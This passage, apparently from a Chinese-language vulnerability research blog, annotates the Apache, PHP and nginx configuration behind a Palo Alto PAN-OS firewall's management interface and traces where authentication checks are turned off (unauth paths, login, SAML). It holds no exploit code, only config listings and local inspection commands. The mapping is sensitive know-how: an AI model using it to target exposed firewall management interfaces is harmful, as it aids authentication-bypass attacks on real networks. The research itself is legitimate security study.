class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Apache 配置文件、模块等的根目录（并非网站根目录）</span><br>ServerRoot <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br><span class="hljs-comment"># Apache 启动后记录 PID 的位置</span><br>PidFile <span class="hljs-string">&quot;/var/run/mgmtui/httpd.pid&quot;</span><br><span class="hljs-comment"># 核心转储文件保存目录</span><br>CoreDumpDirectory <span class="hljs-string">&quot;/var/cores&quot;</span><br><span class="hljs-comment"># Apache 监听本地 28250 端口</span><br>Listen 28250<br><br><span class="hljs-comment"># 监听所有 IP 的 28250 端口</span><br>&lt;VirtualHost _default_:28250&gt;<br><span class="hljs-comment"># 设置环境变量，抓取 Authorization 头内容</span><br>    SetEnvIf Authorization <span class="hljs-string">&quot;(.*)&quot;</span> _HTTP_AUTHORIZATION=<span class="hljs-variable">$1</span><br>&lt;/VirtualHost&gt;<br><br><span class="hljs-comment"># 加载 conf.modules.d 配置</span><br>Include conf.modules.d/*.conf<br><br>User nobody<br>Group nobody<br>ServerName 127.0.0.1<br><span class="hljs-comment"># WEB 根目录</span><br>DocumentRoot <span class="hljs-string">&quot;/var/appweb/htdocs&quot;</span><br><br><span class="hljs-comment"># 如果访问 /PAN_help/*.css|js|html|htm，重写为 .gz 文件（用于前端资源压缩加载）</span><br>&lt;Location <span class="hljs-string">&quot;/&quot;</span>&gt;<br>    DirectorySlash off<br>    RewriteEngine on<br>    RewriteRule ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$ $1$2<span class="hljs-variable">$3</span>.<span class="hljs-variable">$4</span>.gz [QSA,L]<br>    AddEncoding gzip .gz<br>    Options Indexes FollowSymLinks<br>    Require all granted<br>&lt;/Location&gt;<br><br><span class="hljs-comment"># 禁止访问 .htaccess 等以 .ht 开头的文件</span><br>&lt;Files <span class="hljs-string">&quot;.ht*&quot;</span>&gt;<br>    Require all denied<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.css.gz&quot;</span>&gt;<br>    ForceType text/css<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.js.gz&quot;</span>&gt;<br>    ForceType application/javascript<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.html.gz&quot;</span>&gt;<br>    ForceType text/html<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.htm.gz&quot;</span>&gt;<br>    ForceType text/html<br>&lt;/Files&gt;<br>ErrorLogFormat <span class="hljs-string">&quot;%&#123;cu&#125;t %l [%P %&#123;g&#125;T] %F: %E: %M&quot;</span><br>ErrorLog <span class="hljs-string">&quot;/var/log/pan/mgmt_httpd_error.log&quot;</span><br>LogLevel info<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> combined<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> common<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> combinedio<br>CustomLog <span class="hljs-string">&quot;/var/log/pan/mgmt_httpd_access.log&quot;</span> combined<br>TypesConfig /etc/httpd/mime.types<br>AddType application/x-compress .Z<br>AddType application/x-gzip .gz .tgz<br>AddDefaultCharset UTF-8<br>MIMEMagicFile conf/magic<br>EnableMMAP off<br>FileETag None<br></code></pre></td></tr></table></figure><p>子配置：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">ServerRoot <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br>Include <span class="hljs-keyword">conf</span>.modules.d/*.<span class="hljs-keyword">conf</span><br><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>.modules.d<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515155025136.png?imageSlim" alt="image-20250515155025136"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;^\s*#|^\s*$&#x27;</span> <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/mgmtui/</span>conf.modules.d/php-httpd.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 加载 PHP7 模块，使 Apache 能解析 .php 文件</span><br>LoadModule php7_module ../modules/libphp7.so<br><br><span class="hljs-comment"># 禁止 Web 客户端访问以 .user.ini 命名的文件（通常用于 PHP 的用户级配置）</span><br>&lt;Files <span class="hljs-string">&quot;.user.ini&quot;</span>&gt;<br>   Order allow,deny      <span class="hljs-comment"># 默认 deny 优先</span><br>   Deny from all          <span class="hljs-comment"># 拒绝所有访问</span><br>   Satisfy All            <span class="hljs-comment"># 所有条件都需满足（主要用于兼容旧版 Apache）</span><br>&lt;/Files&gt;<br><br><span class="hljs-comment"># 将 .php 文件交给 PHP 模块处理</span><br>AddHandler application/x-httpd-php .php<br><br><span class="hljs-comment"># 指定 php.ini 的位置（PHP 配置文件）</span><br>PHPINIDir <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br><br><span class="hljs-comment"># 当访问目录时，默认首页文件为 index.php</span><br>DirectoryIndex index.php<br><br><span class="hljs-comment"># 特殊情况：将名为 ocsp 的文件（无扩展名）当作 PHP 文件处理</span><br>&lt;FilesMatch ^ocsp$&gt;<br>   SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>PHP 配置文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -vE <span class="hljs-string">&#x27;^\s*;|^\s*$&#x27;</span> <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/mgmtui/</span>php.ini<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[PHP]</span><br><br><span class="hljs-attr">auto_prepend_file</span> = uiEnvSetup.php <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">default_mimetype</span> = <span class="hljs-string">&quot;text/html&quot;</span><br><span class="hljs-attr">default_charset</span> = <span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-attr">include_path</span> = <span class="hljs-string">&quot;.:/var/appweb/htdocs/phpincludes:/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">extension_dir</span> = <span class="hljs-string">&quot;/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED - likely not needed. it is already working</span><br></code></pre></td></tr></table></figure><ul><li><p>auto_prepend_file：在每个PHP脚本开始执行前自动包含进来</p></li><li><p>include_path：设置include()或require()函数包含文件的参考路径</p></li><li><p>extension_dir：php 扩展目录</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>appweb<span class="hljs-regexp">/htdocs/i</span>ndex.php<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515164804368.png?imageSlim" alt="image-20250515164804368"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515164831574.png?imageSlim" alt="image-20250515164831574"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">request =&gt; nginx(<span class="hljs-number">443</span>) =&gt; apache(<span class="hljs-number">28250</span>) =&gt; php(php.ini,index.php) =&gt; envSetup.php =&gt; target.php<br></code></pre></td></tr></table></figure><p>打包 web 目录分析。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -czvf htdocs.tar.gz <span class="hljs-regexp">/var/</span>appweb<span class="hljs-regexp">/htdocs/</span><br></code></pre></td></tr></table></figure><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> nginx<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250516181804420.png?imageSlim" alt="image-20250516181804420"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czvf nginx<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> /etc/nginx<br></code></pre></td></tr></table></figure><p>nginx.conf：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><br><span class="hljs-section">http</span> &#123;<br>  <span class="hljs-comment"># 定义上游服务器, request =&gt; nginx =&gt; backend_mgmt</span><br>  <span class="hljs-section">upstream</span> backend_mgmt &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:28250</span>;<br>  &#125;<br>  <span class="hljs-comment"># 上游服务器返回的跳转处理: 28250 =&gt; Location http://xxx:28250/php/login.php =&gt; Location http://xxx:80/php/login.php(nginx)</span><br>  <span class="hljs-attribute">proxy_redirect</span> http://<span class="hljs-variable">$host</span>:28250/ <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>:<span class="hljs-variable">$server_port</span>/;<br>  <span class="hljs-attribute">proxy_redirect</span> http://<span class="hljs-variable">$proxy_host</span>:28250/ <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>:<span class="hljs-variable">$server_port</span>/;<br><br><br><br>  <span class="hljs-comment"># https server</span><br>  <span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl default_server ipv6only=<span class="hljs-literal">off</span>;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">4443</span> ssl ipv6only=<span class="hljs-literal">off</span>;<br><br><span class="hljs-comment"># $gohost 表示上游服务</span><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohost</span> <span class="hljs-string">&quot;backend_mgmt&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$devonly</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pub</span> <span class="hljs-string">&quot;wildfire.paloaltonetworks.com&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pri</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment"># 包含了一个子配置</span><br>    <span class="hljs-attribute">include</span> conf/locations.conf;<br>  &#125;<br><br>  <span class="hljs-comment"># http server</span><br>  <span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span> ipv6only=<span class="hljs-literal">off</span>;<br><br>    <span class="hljs-comment"># include location rules</span><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohost</span> <span class="hljs-string">&quot;backend_mgmt&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$devonly</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pub</span> <span class="hljs-string">&quot;wildfire.paloaltonetworks.com&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pri</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">include</span> conf/locations.conf;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>conf&#x2F;locations.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 允许的请求方法</span><br>add_header Allow <span class="hljs-string">&quot;GET, HEAD, POST, PUT, DELETE, OPTIONS&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_method</span> !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) &#123;<br>  <span class="hljs-built_in">return</span> 405;<br>&#125;<br><br><span class="hljs-comment"># rewrite_log on;</span><br><br><span class="hljs-comment"># static ones</span><br><span class="hljs-comment"># 统计</span><br>location /nginx_status &#123;<br>  stub_status on;<br>  access_log off;<br>  allow 127.0.0.1;<br>  deny all;<br>&#125;<br><br><span class="hljs-comment"># Chrome cache large source map making them out of date.</span><br><span class="hljs-comment"># 解决 Chrome 缓存大型 source map 文件导致它们过时的问题</span><br>location ~ \.js\.map$ &#123;<br>  add_header Cache-Control <span class="hljs-string">&quot;no-cache; no-store&quot;</span>;<span class="hljs-comment"># 不缓存不存储</span><br>  proxy_pass_header Authorization;<span class="hljs-comment"># 是将客户端请求中的 Authorization 头传递给上游服务器，Authorization nginx 是默认会过滤掉的，所以需要显式的设置传输到上游服务器</span><br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<span class="hljs-comment"># 传输给上游服务</span><br>&#125;<br><br><span class="hljs-comment"># turn on auth check by default</span><br><span class="hljs-comment"># 默认设置 </span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>;<br><br><span class="hljs-comment"># unauth 的时候不检查认证</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> ~ ^\/unauth\/.+$) &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> = /php/logout.php) &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># new login rules</span><br><span class="hljs-comment"># 匹配登录的静态文件 images js</span><br>location ~ ^/login/(images|js)/ &#123;<br>  <span class="hljs-comment"># 重写: /login/(images|js)/(.*)$ =&gt; /$1/login/$2</span><br>  <span class="hljs-comment"># $1 (images|js), $2 (.*)</span><br>  rewrite /login/(images|js)/(.*)$ /<span class="hljs-variable">$1</span>/login/<span class="hljs-variable">$2</span> <span class="hljs-built_in">break</span>;<br>  <span class="hljs-comment"># 静态资源根目录</span><br>  root /var/appweb/htdocs;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>&#125;<br><br>location ~ ^/login/(css|fonts)/ &#123;<br>  root /var/appweb/htdocs/styles/;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>&#125;<br><br>location /php/login.php &#123;<br>  client_max_body_size 1k;<br>  limit_req zone=unauthRateLimit burst=10;<br>  <span class="hljs-comment"># 登录的时候也是关闭认证</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br><br>  proxy_set_header X-Client-Cert <span class="hljs-variable">$ssl_client_escaped_cert</span>;<br>  <span class="hljs-comment"># 包含默认的配置（ 请求头的配置 ）</span><br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># SAML related</span><br>location /SAML20/SP/ACS &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>  proxy_intercept_errors on;<br>  rewrite /SAML20/SP/ACS /unauth/php/DualLogin.php <span class="hljs-built_in">break</span>;<br>  proxy_set_header X-ORIG-URI /SAML20/SP/ACS;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><br><span class="hljs-comment"># not allow json, lock, conf file access</span><br>location ~ ^/(vendor|python)([^\/]*)/(.*).(json|lock|conf)$ &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br><br><span class="hljs-comment"># redirect `/upload/xxx` to panPhpModule</span><br><span class="hljs-comment"># upload 交给 @upload_regular 处理</span><br>location /upload/ &#123;<br>  error_page 402 =200 @upload_regular;<br>  <span class="hljs-built_in">return</span> 402;<br>&#125;<br><br><span class="hljs-comment"># block unauthorized `/upload` access</span><br><span class="hljs-comment"># this prevents hacker dumping files to the system to fill up disk space.</span><br><span class="hljs-comment"># 不允许 upload 的访问</span><br>location /upload &#123;<br>  <span class="hljs-built_in">return</span> 403;<br>&#125;<br><br><span class="hljs-comment"># plugins not going through proxy and backend</span><br>location ~ ^/plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/ &#123;<br>  rewrite /plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/(.*)$<br>  /installed/<span class="hljs-variable">$1</span>/ui/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span><br>  <span class="hljs-built_in">break</span>;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>  root /opt/plugins;<br>&#125;<br><br>location /webui/ &#123;<br>  proxy_http_version 1.1;<br>  <span class="hljs-comment"># ^/webui(\/.*)$ =》 /php-packages/firewall_webui/php/api/index.php$1</span><br>  <span class="hljs-comment"># /webui/abc =&gt; /php-packages/firewall_webui/php/api/index.php/abc</span><br>  rewrite ^/webui(\/.*)$ /php-packages/firewall_webui/php/api/index.php<span class="hljs-variable">$1</span> <span class="hljs-built_in">break</span>;<br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-comment"># if ($content_type ~* &quot;multipart/form-data&quot;) &#123;</span><br>  <span class="hljs-comment">#   error_page 402 =200 @upload_api;</span><br>  <span class="hljs-comment"># &#125;</span><br><br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass_header token;<br>  proxy_pass_header 